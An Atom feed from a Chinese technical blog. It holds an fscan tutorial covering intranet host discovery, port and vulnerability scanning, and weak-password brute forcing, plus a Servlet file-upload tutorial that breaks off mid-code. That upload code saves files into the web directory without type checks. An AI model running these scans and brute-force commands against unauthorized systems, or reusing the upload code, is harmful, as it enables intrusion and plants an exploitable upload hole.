<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦的小屋</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-04-05T11:38:59.692Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>晨曦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fscan内网扫描工具详解</title>
    <link href="http://example.com/2025/04/05/web/%E6%B8%97%E9%80%8F/fscan/"/>
    <id>http://example.com/2025/04/05/web/%E6%B8%97%E9%80%8F/fscan/</id>
    <published>2025-04-05T20:30:00.000Z</published>
    <updated>2025-04-05T11:38:59.692Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-fscan工具简介"><a href="#1-fscan工具简介" class="headerlink" title="1. fscan工具简介"></a>1. fscan工具简介</h2><p>fscan是一款开源的内网综合扫描工具，由Shadow Security Team开发，主要用于内网渗透的快速信息收集。该工具集成了端口扫描、服务识别、各类常见漏洞检测、弱口令检测等多种功能，支持多平台运行，是内网渗透测试中的得力助手。</p><h3 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h3><ul><li>多协议端口扫描</li><li>自动服务识别</li><li>常见漏洞检测</li><li>各类服务的弱口令爆破</li><li>支持主机发现</li><li>支持多种输出格式</li><li>单文件、跨平台、无依赖</li></ul><h2 id="2-安装与获取"><a href="#2-安装与获取" class="headerlink" title="2. 安装与获取"></a>2. 安装与获取</h2><h3 id="2-1-获取方式"><a href="#2-1-获取方式" class="headerlink" title="2.1 获取方式"></a>2.1 获取方式</h3><p>从GitHub下载最新版本：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/shadow1ng/fscan.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或直接下载编译好的二进制文件</span></span><br><span class="line"><span class="comment"># 访问 https://github.com/shadow1ng/fscan/releases</span></span><br></pre></td></tr></table></figure></div><h3 id="2-2-支持平台"><a href="#2-2-支持平台" class="headerlink" title="2.2 支持平台"></a>2.2 支持平台</h3><p>fscan支持多种操作系统平台：</p><ul><li>Windows (32位&#x2F;64位)</li><li>Linux (32位&#x2F;64位)</li><li>MacOS</li></ul><h2 id="3-基本使用方法"><a href="#3-基本使用方法" class="headerlink" title="3. 基本使用方法"></a>3. 基本使用方法</h2><h3 id="3-1-命令行参数"><a href="#3-1-命令行参数" class="headerlink" title="3.1 命令行参数"></a>3.1 命令行参数</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基本扫描语法</span></span><br><span class="line">./fscan -h 目标IP/子网</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用参数</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -p 1-65535    <span class="comment"># 完整端口扫描</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -p 80,443,3306 <span class="comment"># 指定端口</span></span><br><span class="line">./fscan -h 目标 -o result.txt           <span class="comment"># 保存结果到文件</span></span><br></pre></td></tr></table></figure></div><h3 id="3-2-主要参数说明"><a href="#3-2-主要参数说明" class="headerlink" title="3.2 主要参数说明"></a>3.2 主要参数说明</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h  指定目标IP或网段，支持格式:</span><br><span class="line">    192.168.1.1</span><br><span class="line">    192.168.1.1/24</span><br><span class="line">    192.168.1.1-255</span><br><span class="line">    txt文件(每行一个IP或网段)</span><br><span class="line"></span><br><span class="line">-p  指定扫描端口，默认为常见端口</span><br><span class="line">    示例: -p 80,443,3389</span><br><span class="line">    示例: -p 1-65535</span><br><span class="line">    示例: -p -能力检测时，会自动加载</span><br><span class="line"></span><br><span class="line">-pa 启用全部协议检测，消耗资源较大</span><br><span class="line"></span><br><span class="line">-no 不进行存活探测，直接扫描</span><br><span class="line"></span><br><span class="line">-o  输出结果到文件</span><br><span class="line"></span><br><span class="line">-np 不使用ping进行存活检测</span><br><span class="line"></span><br><span class="line">-nopoc 不扫描漏洞</span><br><span class="line"></span><br><span class="line">-nobr 不进行爆破</span><br><span class="line"></span><br><span class="line">-nolan 不扫描内网资产</span><br></pre></td></tr></table></figure></div><h2 id="4-高级功能使用"><a href="#4-高级功能使用" class="headerlink" title="4. 高级功能使用"></a>4. 高级功能使用</h2><h3 id="4-1-主机发现"><a href="#4-1-主机发现" class="headerlink" title="4.1 主机发现"></a>4.1 主机发现</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅执行主机发现</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -m -p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用ICMP进行存活探测</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -ping</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不使用ping进行存活探测</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -np</span><br></pre></td></tr></table></figure></div><h3 id="4-2-服务识别与漏洞扫描"><a href="#4-2-服务识别与漏洞扫描" class="headerlink" title="4.2 服务识别与漏洞扫描"></a>4.2 服务识别与漏洞扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进行Web服务识别及漏洞扫描</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -web</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描全部漏洞</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -full</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不扫描漏洞</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -nopoc</span><br></pre></td></tr></table></figure></div><h3 id="4-3-弱口令爆破"><a href="#4-3-弱口令爆破" class="headerlink" title="4.3 弱口令爆破"></a>4.3 弱口令爆破</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对所有支持的服务进行弱口令爆破</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -user admin -<span class="built_in">pwd</span> admin123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定爆破特定服务</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -m ssh -user admin -<span class="built_in">pwd</span> admin123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自定义密码字典</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -pwdf passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自定义用户名字典</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -userf usernames.txt</span><br></pre></td></tr></table></figure></div><h3 id="4-4-自定义扫描"><a href="#4-4-自定义扫描" class="headerlink" title="4.4 自定义扫描"></a>4.4 自定义扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定线程数</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -t 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置超时时间</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -<span class="built_in">timeout</span> 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只扫描特定模块</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -m smb,mysql,mssql</span><br></pre></td></tr></table></figure></div><h2 id="5-实际应用示例"><a href="#5-实际应用示例" class="headerlink" title="5. 实际应用示例"></a>5. 实际应用示例</h2><h3 id="5-1-快速内网扫描"><a href="#5-1-快速内网扫描" class="headerlink" title="5.1 快速内网扫描"></a>5.1 快速内网扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 快速扫描内网C段</span></span><br><span class="line">./fscan -h 192.168.1.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">[*] Scanning subnet: 192.168.1.0/24</span><br><span class="line">[+] Found alive host: 192.168.1.1</span><br><span class="line">[+] Found alive host: 192.168.1.100</span><br><span class="line">[+] Found alive host: 192.168.1.254</span><br><span class="line">[*] Scanning port <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">[+] 192.168.1.1:80 open</span><br><span class="line">[+] 192.168.1.1:443 open</span><br><span class="line">[+] Web service detected on 192.168.1.1:80</span><br><span class="line">[*] Scanning port <span class="keyword">for</span> 192.168.1.100</span><br><span class="line">[+] 192.168.1.100:22 open</span><br><span class="line">[+] 192.168.1.100:3306 open</span><br><span class="line">[+] 192.168.1.100:8080 open</span><br><span class="line">[+] MySQL service detected on 192.168.1.100:3306</span><br><span class="line">[+] Web service detected on 192.168.1.100:8080</span><br></pre></td></tr></table></figure></div><h3 id="5-2-定向漏洞扫描"><a href="#5-2-定向漏洞扫描" class="headerlink" title="5.2 定向漏洞扫描"></a>5.2 定向漏洞扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 扫描特定漏洞</span></span><br><span class="line">./fscan -h 192.168.1.100 -m ms17010</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">[*] Scanning target: 192.168.1.100</span><br><span class="line">[*] Checking MS17-010 vulnerability</span><br><span class="line">[+] 192.168.1.100 is vulnerable to MS17-010</span><br></pre></td></tr></table></figure></div><h3 id="5-3-针对性弱口令检测"><a href="#5-3-针对性弱口令检测" class="headerlink" title="5.3 针对性弱口令检测"></a>5.3 针对性弱口令检测</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 针对MySQL服务进行弱口令检测</span></span><br><span class="line">./fscan -h 192.168.1.100 -m mysql -user root -pwdf mysql_passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">[*] Scanning MySQL service: 192.168.1.100:3306</span><br><span class="line">[*] Brute forcing MySQL...</span><br><span class="line">[+] MySQL weak password found: root/123456</span><br></pre></td></tr></table></figure></div><h2 id="6-注意事项"><a href="#6-注意事项" class="headerlink" title="6. 注意事项"></a>6. 注意事项</h2><ol><li><p>权限需求</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 部分功能需要管理员/root权限</span><br><span class="line">sudo ./fscan -h 192.168.1.1/24</span><br></pre></td></tr></table></figure></div></li><li><p>扫描流量</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 大范围扫描会产生大量流量，可能触发IDS/IPS</span><br><span class="line">./fscan -h 192.168.1.1/24 -t 10  # 降低线程数减轻影响</span><br></pre></td></tr></table></figure></div></li><li><p>误报处理</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 漏洞扫描可能存在误报，需要手动验证</span><br><span class="line">./fscan -h 192.168.1.1 -full -o result.txt  # 输出结果后进行人工分析</span><br></pre></td></tr></table></figure></div></li><li><p>合规使用</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 仅在授权的环境中使用</span><br><span class="line"># 未经许可使用可能违反法律法规</span><br></pre></td></tr></table></figure></div></li></ol><h2 id="7-最佳实践"><a href="#7-最佳实践" class="headerlink" title="7. 最佳实践"></a>7. 最佳实践</h2><ol><li><p>分阶段扫描</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一阶段：主机发现</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -m -p -o alive_hosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二阶段：端口扫描</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -no -p 1-65535 -o open_ports.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三阶段：漏洞扫描</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -no -full -o vulnerabilities.txt</span><br></pre></td></tr></table></figure></div></li><li><p>针对性扫描</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 针对Web服务器</span></span><br><span class="line">./fscan -h 192.168.1.100 -p 80,443,8080 -web</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对数据库服务器</span></span><br><span class="line">./fscan -h 192.168.1.101 -p 1433,3306,5432 -m mysql,mssql,postgresql</span><br></pre></td></tr></table></figure></div></li><li><p>降低影响</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 降低线程数</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -t 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制扫描范围</span></span><br><span class="line">./fscan -h 192.168.1.100-110 -p 22,80,443,3306,3389</span><br><span class="line"></span><br><span class="line"><span class="comment"># 避开敏感时间</span></span><br><span class="line"><span class="comment"># 在网络流量低的时段执行扫描</span></span><br></pre></td></tr></table></figure></div></li><li><p>结果分析</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将结果输出到不同文件进行分类分析</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -o scan_results.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用grep提取关键信息</span></span><br><span class="line">grep <span class="string">&quot;weak password&quot;</span> scan_results.txt &gt; weak_passwords.txt</span><br><span class="line">grep <span class="string">&quot;vulnerable&quot;</span> scan_results.txt &gt; vulnerabilities.txt</span><br></pre></td></tr></table></figure></div></li></ol><h2 id="8-进阶用法"><a href="#8-进阶用法" class="headerlink" title="8. 进阶用法"></a>8. 进阶用法</h2><h3 id="8-1-与其他工具联动"><a href="#8-1-与其他工具联动" class="headerlink" title="8.1 与其他工具联动"></a>8.1 与其他工具联动</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 扫描结果传递给其他工具</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -p 80,443 -o web_servers.txt</span><br><span class="line"><span class="built_in">cat</span> web_servers.txt | grep open | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; targets.txt</span><br><span class="line"><span class="comment"># 将targets.txt传给其他漏洞扫描工具</span></span><br></pre></td></tr></table></figure></div><h3 id="8-2-自定义扫描模板"><a href="#8-2-自定义扫描模板" class="headerlink" title="8.2 自定义扫描模板"></a>8.2 自定义扫描模板</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为特定环境创建扫描脚本</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">&#x27;EOF&#x27;</span> &gt; custom_scan.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 快速扫描脚本</span></span><br><span class="line">./fscan -h <span class="variable">$1</span> -p 22,80,443,3306,3389 -o quick_scan.txt</span><br><span class="line"><span class="comment"># 分析结果</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;发现开放服务:&quot;</span></span><br><span class="line">grep <span class="string">&quot;open&quot;</span> quick_scan.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;发现漏洞:&quot;</span></span><br><span class="line">grep <span class="string">&quot;vulnerable&quot;</span> quick_scan.txt</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x custom_scan.sh</span><br><span class="line">./custom_scan.sh 192.168.1.1/24</span><br></pre></td></tr></table></figure></div><h3 id="8-3-批量扫描"><a href="#8-3-批量扫描" class="headerlink" title="8.3 批量扫描"></a>8.3 批量扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建目标文件</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">&#x27;EOF&#x27;</span> &gt; targets.txt</span><br><span class="line">192.168.1.0/24</span><br><span class="line">192.168.2.0/24</span><br><span class="line">10.10.10.1-100</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量扫描</span></span><br><span class="line">./fscan -h targets.txt -o batch_results.txt</span><br></pre></td></tr></table></figure></div><p>未经授权的扫描可能违反法律法规</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    <category term="渗透" scheme="http://example.com/categories/web/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="内网扫描" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F/"/>
    
    <category term="网络安全" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="漏洞扫描" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>Servlet文件上传与下载实现</title>
    <link href="http://example.com/2025/04/05/java/servlet/servlet%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/"/>
    <id>http://example.com/2025/04/05/java/servlet/servlet%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/</id>
    <published>2025-04-05T19:44:00.000Z</published>
    <updated>2025-04-05T11:38:59.690Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Servlet文件上传与下载实现"><a href="#Servlet文件上传与下载实现" class="headerlink" title="Servlet文件上传与下载实现"></a>Servlet文件上传与下载实现</h1><p>文件上传和下载是Web应用中常见的功能需求。本文将详细介绍如何使用Servlet技术实现文件的上传与下载。</p><h2 id="1-文件上传实现"><a href="#1-文件上传实现" class="headerlink" title="1. 文件上传实现"></a>1. 文件上传实现</h2><h3 id="1-1-基于Commons-FileUpload实现"><a href="#1-1-基于Commons-FileUpload实现" class="headerlink" title="1.1 基于Commons FileUpload实现"></a>1.1 基于Commons FileUpload实现</h3><p>Apache Commons FileUpload是一个用于处理HTTP文件上传的简单易用的组件。</p><h4 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h4><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="完整代码示例"><a href="#完整代码示例" class="headerlink" title="完整代码示例"></a>完整代码示例</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="comment">// 上传文件存储目录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">UPLOAD_DIRECTORY</span> <span class="operator">=</span> <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">    <span class="comment">// 上传配置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MEMORY_THRESHOLD</span> <span class="operator">=</span> <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">3</span>;  <span class="comment">// 3MB</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_FILE_SIZE</span> <span class="operator">=</span> <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">40</span>;    <span class="comment">// 40MB</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_REQUEST_SIZE</span> <span class="operator">=</span> <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">50</span>; <span class="comment">// 50MB</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 检测是否为多媒体上传</span></span><br><span class="line">        <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;</span><br><span class="line">            <span class="comment">// 如果不是则停止</span></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            writer.println(<span class="string">&quot;错误：表单必须包含 enctype=multipart/form-data&quot;</span>);</span><br><span class="line">            writer.flush();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置上传参数</span></span><br><span class="line">        <span class="type">DiskFileItemFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiskFileItemFactory</span>();</span><br><span class="line">        <span class="comment">// 设置内存临界值 - 超过后将产生临时文件并存储于临时目录中</span></span><br><span class="line">        factory.setSizeThreshold(MEMORY_THRESHOLD);</span><br><span class="line">        <span class="comment">// 设置临时存储目录</span></span><br><span class="line">        factory.setRepository(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)));</span><br><span class="line">        </span><br><span class="line">        <span class="type">ServletFileUpload</span> <span class="variable">upload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置最大文件上传值</span></span><br><span class="line">        upload.setFileSizeMax(MAX_FILE_SIZE);</span><br><span class="line">        <span class="comment">// 设置最大请求值(包含文件和表单数据)</span></span><br><span class="line">        upload.setSizeMax(MAX_REQUEST_SIZE);</span><br><span class="line">        <span class="comment">// 中文处理</span></span><br><span class="line">        upload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造临时路径来存储上传的文件</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uploadPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;./&quot;</span>) + File.separator + UPLOAD_DIRECTORY;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果目录不存在则创建</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 解析请求的内容提取文件数据</span></span><br><span class="line">            List&lt;FileItem&gt; formItems = upload.parseRequest(request);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (formItems != <span class="literal">null</span> &amp;&amp; formItems.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 迭代处理每个文件</span></span><br><span class="line">                <span class="keyword">for</span> (FileItem item : formItems) &#123;</span><br><span class="line">                    <span class="comment">// 处理不在表单中的字段</span></span><br><span class="line">                    <span class="keyword">if</span> (!item.isFormField()) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(item.getName()).getName();</span><br><span class="line">                        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> uploadPath + File.separator + fileName;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">storeFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">// 在控制台输出文件的上传路径</span></span><br><span class="line">                        System.out.println(<span class="string">&quot;上传文件路径: &quot;</span> + filePath);</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">// 保存文件到硬盘</span></span><br><span class="line">                        item.write(storeFile);</span><br><span class="line">                        request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;文件上传成功!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;错误信息: &quot;</span> + ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 跳转到结果页面</span></span><br><span class="line">        getServletContext().getRequestDispatcher(<span class="string">&quot;/result.jsp&quot;</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="1-2-基于Servlet-3-0-MultipartConfig实现"><a href="#1-2-基于Servlet-3-0-MultipartConfig实现" class="headerlink" title="1.2 基于Servlet 3.0+ @MultipartConfig实现"></a>1.2 基于Servlet 3.0+ @MultipartConfig实现</h3><p>Servlet 3.0及以上版本提供了内置的文件上传支持，无需额外的库。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/upload&quot;)</span></span><br><span class="line"><span class="meta">@MultipartConfig(</span></span><br><span class="line"><span class="meta">        fileSizeThreshold = 1024 * 1024, // 1 MB</span></span><br><span class="line"><span class="meta">        maxFileSize = 1024 * 1024 * 10,  // 10 MB</span></span><br><span class="line"><span class="meta">        maxRequestSize = 1024 * 1024 * 15, // 15 MB</span></span><br><span class="line"><span class="meta">        location = &quot;/tmp&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取文件存储路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uploadPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 解析请求，获取所有上传的文件</span></span><br><span class="line">            Collection&lt;Part&gt; parts = 